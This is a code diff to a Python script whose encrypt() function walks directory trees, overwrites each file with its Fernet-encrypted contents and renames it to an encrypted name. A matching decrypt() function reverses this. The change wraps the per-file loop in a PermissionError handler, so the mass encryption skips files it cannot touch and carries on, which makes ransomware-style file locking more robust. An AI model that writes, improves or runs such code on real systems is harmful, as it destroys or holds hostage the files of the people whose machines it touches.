@@ -49,13 +49,16 @@ def encrypt():
         if r == "." or "venv" in r or ".idea" in r:
             continue
         for file in f:
-            location = f"{r}\\{file}"
-            with open(location, "rb") as r_stream:
-                plaintext = r_stream.read()
-            with open(location, "wb") as w_stream:
-                w_stream.write(key.encrypt(plaintext))
+            try:
+                location = f"{r}\\{file}"
+                with open(location, "rb") as r_stream:
+                    plaintext = r_stream.read()
+                with open(location, "wb") as w_stream:
+                    w_stream.write(key.encrypt(plaintext))
 
-            os.rename(location, f"{r}\\{key.encrypt(bytes(file.encode('utf-8'))).decode('utf-8')}")
+                os.rename(location, f"{r}\\{key.encrypt(bytes(file.encode('utf-8'))).decode('utf-8')}")
+            except PermissionError:
+                pass
 
 
 def decrypt():
@@ -72,7 +75,7 @@ def decrypt():
                     w_stream.write(key.decrypt(encrypted))
 
                 os.rename(location, f"{r}\\{key.decrypt(file).decode('utf-8')}")
-            except (binascii.Error, cryptography.fernet.InvalidToken):
+            except (binascii.Error, cryptography.fernet.InvalidToken, PermissionError):
                 with open(f"{r}\\{file}", "wb") as w_stream:
                     w_stream.write(encrypted)
 
